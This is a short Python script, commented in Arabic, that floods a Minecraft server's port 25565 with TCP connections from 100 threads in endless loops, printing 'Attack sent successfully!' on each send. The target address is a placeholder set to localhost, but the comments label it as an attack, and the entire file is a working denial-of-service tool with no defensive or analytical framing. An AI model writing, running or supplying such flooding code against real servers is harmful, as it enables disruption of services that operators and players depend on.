import socket
import threading
from colorama import init, Fore

# تهيئة مكتبة colorama
init(autoreset=True)

# إعدادات الهجوم
target_ip = '127.0.0.1'  # عنوان IP لخادم Minecraft
target_port = 25565       # المنفذ الافتراضي لخوادم Minecraft
num_threads = 100         # عدد الثريدات لمحاكاة حركة المرور

def attack():
    while True:
        try:
            # إنشاء اتصال سوكيت
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, target_port))
            
            # إرسال رسالة فورية بسيطة
            s.sendto(b"Hello\r\n", (target_ip, target_port))
            s.close()

            # طباعة رسالة عند نجاح الإرسال
            print(Fore.LIGHTGREEN_EX + "[!] Attack sent successfully!")

        except Exception as e:
            print(Fore.RED + f"خطأ: {e}")

# إنشاء عدد من الثريدات لتنفيذ الهجوم بشكل متوازي
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=attack)
    thread.start()
    threads.append(thread)

# الانتظار حتى تنتهي جميع الثريدات
for thread in threads:
    thread.join()